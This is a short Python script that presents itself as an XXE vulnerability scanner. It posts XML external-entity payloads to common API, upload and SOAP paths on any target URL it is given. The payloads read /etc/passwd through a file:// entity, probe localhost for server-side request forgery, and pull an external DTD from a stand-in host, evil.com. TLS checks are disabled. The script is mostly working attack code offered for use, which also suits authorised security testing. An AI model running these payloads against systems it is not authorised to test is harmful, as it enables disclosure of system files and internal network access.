#!/usr/bin/env python3
"""
XXE (XML External Entity) Scanner
Detects XXE vulnerabilities
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "file"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>', "ssrf"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]>', "ext_dtd"),
]

def scan(target):
    print(f"[*] XXE Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    xml_paths = ['/api/xml', '/api/upload', '/upload', '/parse', '/api/parse', '/soap', '/api/soap']
    headers = {'Content-Type': 'application/xml'}
    
    for path in xml_paths:
        url = target + path
        print(f"[*] Testing {url}")
        for payload, ptype in PAYLOADS:
            try:
                r = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
                if 'root:' in r.text or 'daemon' in r.text or 'localhost' in r.text:
                    print(f"[!] Possible XXE: {url} ({ptype})")
                    found.append({'url': url, 'type': ptype})
            except:
                pass
    
    print("[*] Testing generic endpoints...")
    params = ['xml', 'data', 'body', 'content', 'input']
    for param in params:
        for payload, ptype in PAYLOADS[:1]:
            try:
                r = requests.post(target, data={param: payload}, timeout=10, verify=False)
            except:
                pass
    
    print("\n" + "="*50)
    if found:
        print(f"[!] Found {len(found)} potential XXE issues")
    else:
        print("[*] No XXE vulnerabilities detected")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='XXE Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)